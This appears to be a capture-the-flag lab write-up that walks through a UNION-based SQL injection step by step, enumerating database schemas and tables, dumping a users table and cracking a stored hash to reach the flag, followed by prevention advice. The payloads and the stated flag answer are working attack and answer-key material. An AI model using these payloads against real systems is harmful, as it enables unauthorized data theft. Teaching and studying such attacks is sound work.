# SQL Injection Exploit Guide

## 1. Determine the Number of Columns

To begin exploiting SQL injection, you must first determine the number of columns returned by the query. Start by testing with a single column:

```sql
42 UNION SELECT null
```

If you receive the error "The used SELECT statements have a different number of columns," it indicates that there are more columns. Incrementally increase the number of `null` values until the query executes without error.

Test if there is two columns:

```sql
42 UNION SELECT null, null;
```

The query executes successfully, you know the correct number of columns is two.

## 2. Retrieve Table Schema and Types

Next, identify the schema and types of tables in the database. This is critical to understanding the structure of the database:

```sql
42 UNION SELECT table_schema, table_type FROM information_schema.tables
```

The results include schemas with base tables (those that hold actual data), such as `Member_Brute_Force`, `Member_Sql_Injection`, `Member_guestbook`, and `Member_images`.

## 3. Identify Table Names in Each Schema

To locate specific table names within these schemas, use:

```sql
42 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.columns
```

Exclude results related to the `information_schema` schema, as it does not contain user data. Focus on results like:

- `Member_Brute_Force/db_default`
- `Member_Sql_Injection/users`
- `Member_guestbook/guestbook`
- `Member_images/list_images`
- `Member_survey/vote_dbs`

For this exploit, we will focus on the `users` table in the `Member_Sql_Injection` schema.

## 4. Find Column Names in Tables

Retrieve the column names from the target table:

```sql
42 UNION SELECT table_name, column_name FROM information_schema.columns
```

This query reveals the specific columns available within the tables, such as `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, and `countersign` in the `Member_Sql_Injection.users` table.

## 5. Extract Data from Member_Sql_Injection.users Table

Now, extract data from the columns in the `Member_Sql_Injection.users` table. Start with the "user_id" and "first_name" columns:

```sql
42 UNION SELECT user_id, first_name FROM Member_Sql_Injection.users
```

Then, extract data from the "last_name" and "town" columns:

```sql
42 UNION SELECT last_name, town FROM Member_Sql_Injection.users
```

Then, extract data from the "country" and "planet" columns:

```sql
42 UNION SELECT country, planet FROM Member_Sql_Injection.users
```

Then, extract data from the "Commentaire" and "countersign" columns:

```sql
42 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users
```

## 6. Decode the Final Flag

The final query returns data that includes instructions for obtaining the flag:

```sql
ID: 42 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

To decode:

1. Decode the MD5 hash `5ff9d0165b4f92b14994e5c685cdce28` to obtain `FortyTwo`.
2. Hash `fortytwo` with SHA256 to yield the final flag:

`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Prevention

1. **Use Prepared Statements**: Prepared statements or parameterized queries separate SQL code from data, preventing SQL injection.
2. **Employ ORM Libraries**: Object-Relational Mapping (ORM) tools abstract away SQL and automatically handle input escaping.
3. **Escape User Inputs**: If you cannot use prepared statements, ensure user input is properly escaped.
4. **Validate and Sanitize Inputs**: Check user inputs against expected formats and sanitize them to remove harmful characters.
5. **Limit Database Privileges**: Apply the principle of least privilege, giving users only the permissions they absolutely need.
6. **Error Handling**: Show generic error messages to users and log detailed errors securely on the server.
7. **Regular Updates**: Regularly update your DBMS and libraries to protect against known vulnerabilities.

## Resources

- [Information Schema Tables](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/)
- [Information Schema Columns](https://www.mssqltips.com/sqlservertutorial/183/information-schema-columns/)
- [MD5 Encrypt/Decrypt](https://10015.io/tools/md5-encrypt-decrypt)
- [SHA256 Encrypt/Decrypt](https://10015.io/tools/sha256-encrypt-decrypt)
